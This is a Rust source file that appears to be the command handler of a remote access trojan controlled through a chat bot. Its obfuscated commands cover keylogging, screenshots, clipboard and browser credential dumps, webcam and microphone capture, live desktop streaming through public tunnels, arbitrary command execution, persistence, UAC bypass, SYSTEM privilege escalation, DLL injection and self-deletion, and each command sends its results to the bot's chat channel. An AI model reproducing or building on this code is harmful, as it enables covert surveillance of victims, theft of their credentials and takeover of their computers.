
use anyhow::Result;
use ngrok::tunnel::EndpointInfo;
use serenity::async_trait;
use std::path::{Path, PathBuf};

use crate::obfuscate;
use crate::modules::*;


#[async_trait]
pub trait MessageSender: Send + Sync {
    async fn message(&self, content: &str) -> Result<()>;
    async fn upload(&self, path: String) -> Result<()>;
}

pub async fn command_handler(bot: &impl MessageSender, full_command: &str) -> Result<()> {

        let mut value = full_command.split_whitespace(); 
        let cmd = value.next().unwrap_or("");
    
        // Commands dispatcher
        match cmd.to_lowercase().as_str() {

    // ---> /hello
            c if c == obfuscate!("/hello") => {
                match user::id().await {
                    Ok(id) => bot.message(&format!("{} is online!",id)).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to get user id. Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };
            }
           
    // ---> /help
            c if c == obfuscate!("/help") => {
                let menu = help().await;
                for chunk in split_output(&menu) {
                    bot.message(&chunk).await?; 
                }
            
            }
    // ---> /persist
            c if c == obfuscate!("/persist") => {
                
                match persist::persist() {
                    Ok(_) => bot.message(&obfuscate!("Persistence succeeded!")).await?,
                    Err(e) => {
                        let msg = obfuscate!("[!] Persistence failed: ");
                        bot.message(&format!("{msg}{e}")).await?;
                        return Ok(());
                    }
                };
            }

    // ---> /self_del
            c if c == obfuscate!("/self_del") => {
                
                match destruct::self_delete() {
                    Ok(_) => bot.message(&obfuscate!("Self-deleting ...")).await?,
                    Err(e) => {
                        let msg = obfuscate!("[!] Self deletion failed: ");
                        bot.message(&format!("{msg}{e}")).await?;
                        return Ok(());
                    }
                };
            }
    // ---> /keylog
            c if c == obfuscate!("/keylog") => {
                match keylog::start().await {
                    Ok(log_file) => {
                        let msg = obfuscate!("Recording keystrokes to : ");
                        bot.message(&format!("{msg}{log_file} ...")).await?;
                    },
                    Err(e) => {
                        let msg = obfuscate!("Failed to start keylogger. Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };  
            }

    // ---> /keylog_stop 
            c if c == obfuscate!("/keylog_stop") => {
                bot.message(&obfuscate!("Stop keylogging thread ...")).await?;
                match keylog::stop().await {
                    Ok(_) => bot.message(&obfuscate!("Thread stopped!")).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to stop keylogging thread, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };

            }
    // ---> /screenshot
            c if c == obfuscate!("/screenshot") => {
                let img_path = match screenshot::screenshot().await {
                    Ok(path) => bot.upload(path).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to take screenshot. Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }        
                };
                
                //exec::cmd(format!("del {}", img_path).to_str());
            } 
    // ---> /clipboard
            c if c == obfuscate!("/clipboard") => {
                match clipboard::get().await {
                    Ok(data) => bot.message(&data).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to get clipboard data. Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };

            } 

    // ---> /sysinfo
            c if c == obfuscate!("/sysinfo") => {
                
                match system::info().await {
                    Ok(info) => bot.message(&info).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to retrieve system informations, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };
                
            }   

    // ---> /pid
            c if c == obfuscate!("/pid") => {
                let pid = std::process::id();
                bot.message(&format!("{pid}")).await?;
            } 

    // ---> /ps
            c if c == obfuscate!("/ps") => {
                let processes = match system::proc_list().await {
                    Ok(list) => list,
                    Err(e) => {
                        let msg = obfuscate!("Failed to list running processes, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                        return Ok(());
                        }
                };

                for chunk in split_output(&processes) {
                    bot.message(&chunk).await?; 
                }
                
                
            } 
    // ---> /pkill
            c if c == obfuscate!("/pkill") => {
                let pid = value.next().unwrap_or("");

                match ps::pkill(pid).await {
                    Ok(result) => bot.message(&result).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to kill process with pid: ");
                        bot.message(&format!("{msg}{pid}, {e}")).await?;
                    }
                };

                            
            } 
    // ---> /inject
            c if c == obfuscate!("/inject") => {
                let pid = value.next().unwrap_or("");
                let dll = value.last().unwrap_or("");

                match inject::injector(pid, dll).await {
                    Ok(_) => bot.message(&obfuscate!("Injection successfull!")).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to inject process with pid: ");
                        bot.message(&format!("{msg}{pid}, {e}")).await?;
                    }
                };

                            
            }


    // ---> /drv
            c if c == obfuscate!("/drv") => {
                match system::drives().await {
                    Ok(list) => bot.message(&list).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to list drives, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };
                
            } 

    // ---> /sw
            c if c == obfuscate!("/sw") => {
                let list = match system::sw().await {
                    Ok(list) => list,
                    Err(e) => {
                        let msg = obfuscate!("Failed to list installed software, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                        return Ok(());
                        }
                };
                
                for chunk in split_output(&list) {
                    bot.message(&chunk).await?;
                } 
            } 

    // ---> /hw
            c if c == obfuscate!("/hw") => {
                let list = match system::hw().await {
                    Ok(list) => list,
                    Err(e) => {
                        let msg = obfuscate!("Failed to list available hardware, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                        return Ok(());
                        }
                };
                
                for chunk in split_output(&list) {
                    bot.message(&chunk).await?;
                }
            } 
    // ---> /net
            c if c == obfuscate!("/net") => {
                let list = match system::net().await {
                    Ok(list) => list,
                    Err(e) => {
                        let msg = obfuscate!("Failed to list Network Adapters, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                        return Ok(());
                        }
                };
                
                for chunk in split_output(&list) {
                    bot.message(&chunk).await?;
                }
            } 
    // ---> /users
            c if c == obfuscate!("/users") => {
                let list = match system::users().await {
                    Ok(list) => list,
                    Err(e) => {
                        let msg = obfuscate!("Failed to list system users, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                        return Ok(());
                        }
                };
                
                for chunk in split_output(&list) {
                    bot.message(&chunk).await?;
                }
            }

    // ---> /exit                
            c if c == obfuscate!("/exit") => {

                bot.message("Shutting down...").await?;
                std::process::exit(0);
            }

    ////////------------- File System Commands -------------////////

    // ---> /pwd
            c if c == obfuscate!("/pwd") => {
                let wd = file_system::pwd();
                bot.message(&wd).await?;
            }        
            
    // ---> /ls /dir .
            c if c == obfuscate!("/dir") => {
                let mut path: &str = &file_system::pwd();

                // check if the user supplied a path
                if full_command.len() > 4 {
                    path = full_command.split_at(5).1
                };
                    
                let output = file_system::ls(path);
                bot.message(&output).await?;
            }  

    // ---> /cd
            c if c == obfuscate!("/cd") => {

                // check if the user supplied a path
                if full_command.len() <= 3 {
                    bot.message(&obfuscate!("Please specify a destination path")).await?;
                } else {

                    let path = full_command.split_at(4).1;
                    let output = file_system::change_dir(path);
                    bot.message(&output).await?;
                }
            }

    // ---> /search
            c if c == obfuscate!("/search") => {

                let file_path = value.next().unwrap_or("");
                let file_name = value.next().unwrap_or("");
                
                match file_system::search(&PathBuf::from(file_path), file_name) {
                    Ok(result) => bot.message(&result).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to search for : ");
                        bot.message(&format!("{msg}{file_name} inside: '{file_path}', Error: {e}")).await?;
                    }
                };
            }
    // ---> /chat
            c if c == obfuscate!("/chat") => {

                let text = &full_command[5..];
                
                match gui::msg(&text).await {
                    Ok(_) => bot.message(&format!("Message shown : {}", &text)).await?,
                    Err(e) => bot.message(&format!("Failed to display Message, Error: {}", e)).await?
                };
            }

    // ---> /exec 
            c if c == obfuscate!("/exec") => {
                let exec_cmd = value.next().unwrap_or("");
                if exec_cmd.len() == 0 {
                    bot.message(&obfuscate!("Please send a valid cammand to excute!")).await;
                    return Ok(());
                }
                let output = match exec::cmd(exec_cmd).await {
                    Ok(out) => out,
                    Err(e) => {
                        let msg = obfuscate!("Failed to execute command, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                        return Ok(());
                        }
                };

                for chunk in split_output(&output){
                    bot.message(&chunk).await?;
                }
            }
    // ---> /getprivs 
            c if c == obfuscate!("/privs") => {
                let output = match user::getprivs().await {
                    Ok(privs) => privs,
                    Err(e) => {
                        let msg = obfuscate!("Failed to retrieve privileges, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                        return Ok(());
                        }
                };

                for chunk in split_output(&output){
                    bot.message(&chunk).await?;
                }

            }
    // ---> /bypass_uac 
            c if c == obfuscate!("/bypass_uac") => {
                match privesc::bypass_uac().await {
                    Ok(_) => bot.message(&obfuscate!("UAC bypassed!")).await?,
                    Err(e) => {
                        bot.message(&format!("{e}")).await?;
                    }
                };
            }
    // ---> /get_system 
            c if c == obfuscate!("/get_system") => {
                match privesc::get_system().await {
                    Ok(_) => bot.message(&obfuscate!("Running as SYSTEM")).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to obtain SYSTEM privileges : ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };
            }
    // ---> /uid 
            c if c == obfuscate!("/uid") => {
                match user::id().await {
                    Ok(id) => bot.message(&id).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to retrieve privileges, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };
            }

    // ---> /location 
            c if c == obfuscate!("/location") => {
                match user::location() {
                    Ok(location) => bot.message(&location).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to retrieve live location informations, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };
                
            }

    // ---> /upload 
            c if c == obfuscate!("/upload") => {

                // check if the user supplied a path
                if full_command.len() <= 7 {
                    bot.message(&obfuscate!("Please specify a file or pattern to upload!")).await?;
                } else {
                    let path = value.next().unwrap_or("");
                    bot.upload(path.to_string()).await?;
                }   

            }
    // ---> /webcam_list
            c if c == obfuscate!("/webcam_list") => {

                match webcam::list().await{
                    Ok(list) => bot.message(&list).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to list available cameras, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };
                
            }

    // ---> /webcam_snap 
            c if c == obfuscate!("/webcam_snap") => {
                let index = value.next().unwrap_or("");
                if index.len() == 0 {
                    bot.message(&obfuscate!("Please specify a webcam index!")).await;
                    return Ok(());
                }
                match webcam::snap(index){
                    Ok(s) => bot.upload(s).await?,
                    Err(e) =>{ 
                        let msg = obfuscate!("Failed to take a webcam snap, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };
                
            }

    // ---> /stream_desktop
            c if c == obfuscate!("/stream_desktop") => {

                bot.message(&obfuscate!("Starting the streaming tunnel ...")).await?;               
                
                let tunnel = match tunnel::start(&obfuscate!("http://127.0.0.1:80")).await {
                    Ok(tunnel) => tunnel,
                    Err(e) => {
                        let msg = obfuscate!("Failed to start the streaming tunnel. Error : ");
                        bot.message(&format!("{msg}{e}")).await?;
                        return Ok(());
                    }
                        
                };

                let msg = obfuscate!("Public URL: ");
                bot.message(&format!("{}{}", msg, tunnel.url().to_string())).await?;

                match tunnel::server(1, &obfuscate!("http://127.0.0.1:80"), tunnel).await {
                    Ok(tunnel) => bot.message(&obfuscate!("Server started ...")).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to start the streaming server. Error : ");
                        bot.message(&format!("{msg}{e}")).await?;
                        println!("{:?}", &msg);
                    }
                };
            } 

// ---> /stream_webcam 
            c if c == obfuscate!("/stream_webcam") => {

                match webcam::list().await{
                    Ok(list) => {},
                    Err(e) => {
                        bot.message(&format!("{e}")).await?;
                    }
                };

                bot.message(&obfuscate!("Starting the streaming tunnel ...")).await?;
                let tunnel = match tunnel::start(&obfuscate!("http://127.0.0.1:80")).await {
                    Ok(tunnel) => tunnel,
                    Err(e) => {
                        let msg = obfuscate!("Failed to start the streaming tunnel. Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                        return Ok(());
                    }
                };

                let msg = obfuscate!("Public URL: ");
                bot.message(&format!("{}{}", msg, tunnel.url().to_string())).await?;

                match tunnel::server(2, &obfuscate!("http://127.0.0.1:80"), tunnel).await {
                    Ok(tunnel) => bot.message(&obfuscate!("Server started ...")).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to start the streaming server. Error : ");
                        bot.message(&format!("{msg}{e}")).await?;

                    }
                };

            }
    // ---> /stream_stop 
            c if c == obfuscate!("/stream_stop") => {
                bot.message("Stop streaming threads ...").await?;
                match tunnel::stream_stop().await {
                    Ok(_) => bot.message( "Threads stopped!").await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to stop streaming threads, Error: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    
                    }
                };
                
            }

    // ---> /browser_dump 
            c if c == obfuscate!("/browser_dump") => {

                match browsers::chromium::dump() {
                    Ok(dump_file) => bot.upload(dump_file).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to dump chromium browsers: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };
                
                match browsers::firefox::dump() {
                    Ok(dump_file) => bot.upload(dump_file).await?,
                    Err(e) => {
                        let msg = obfuscate!("Failed to dump firefox browser: ");
                        bot.message(&format!("{msg}{e}")).await?;
                    }
                };               
            }

    // ---> /recaudio 
            c if c == obfuscate!("/recaudio") => {
                // check if the user supplied a path
                if full_command.len() <= 10 {
                    bot.message(&obfuscate!("Please specify the duration in seconds!")).await?;
                } else {
                    let secs = value.next().unwrap_or("");
                    let audio = match audio::record(secs).await{
                        Ok(s) => s,
                        Err(e) => {
                            let msg = obfuscate!("Failed to record audio, Error: ");
                            bot.message(&format!("{msg}{e}")).await?;
                            return Ok(());
                        }
                    };
                    bot.upload(audio).await?;
                }
            }
            
    // ---> invalid commands 
            _=> {
                bot.message(&obfuscate!("Please send a valid command!")).await?;
            }
        };

	Ok(())
}


// Splitting the commands output is necessary to bypass the characters limit >:'(
pub fn split_output(output: &str) -> Vec<String> {
    let mut chunks = Vec::new();
    let mut start = 0;

    while start < output.len() {
        let end = std::cmp::min(start + 2000, output.len());
        chunks.push(output[start..end].to_string());
        start = end;
    }

    chunks
}



async fn help() -> String {

    let menu = String::from(obfuscate!("
    
*b_ /hello _b*        Check if the bot is acive on the host
*b_ /help  _b*        Print help message

*b_ /persist _b*      Maintain access after reboot
*b_ /sleep _b*        Sleep. Usage: /sleep (seconds)
*b_ /reboot _b*       Reboot the host
*b_ /shutdown _b*     Shutdown the host
*b_ /exit _b*         End the session
*b_ /self_del _b*     Self-delete the executable 

*b_ /pwd _b*          Print working directory
*b_ /dir _b*          List working directory
*b_ /cd _b*           Change directory. Usage: /cd (path)
*b_ /search _b*       Search for files. Usage: /search (path) (file)
*b_ /upload _b*       Upload files. Usage: /upload (file), /upload *.jpg

*b_ /uid _b*          Get the user id
*b_ /users _b*        List the available users
*b_ /privs _b*        List the privileges
*b_ /sysinfo _b*      Print system informations
*b_ /location _b*     Print geolocation informations

*b_ /exec _b*         Execute a command 
*b_ /pid _b*          Show the current process ID
*b_ /ps _b*           List running processes
*b_ /hw _b*           List installed hardware
*b_ /sw _b*           list installed software
*b_ /drv _b*          List connected drives
*b_ /net _b*          List network Adapters

*b_ /pkill _b*        Kill process by PID
*b_ /chat _b*         Display a custom message to the user 

*b_ /webcam_list _b*      List available webcams
*b_ /webcam_snap _b*      Take a webcam snapshot
*b_ /recaudio _b*         Record audio
*b_ /screenshot _b*       Take a screenshot

*b_ /keylog _b*           Start keylogging
*b_ /keylog_stop _b*      Stop keylogging threads

*b_ /browser_dump _b*     Dump browser data
*b_ /clipboard _b*        Dump clipboard data

*b_ /stream_desktop _b*   Live stream the host desktop
*b_ /stream_webcam _b*    Live stream the host webcam
*b_ /stream_stop _b*      Stop live streaming threads

*b_ /get_system _b*       Elevate privileges to SYSTEM
*b_ /bypass_uac _b*       Bypass UAC prompts

*b_ /inject _b*       Inject a target process

"));

    menu
}



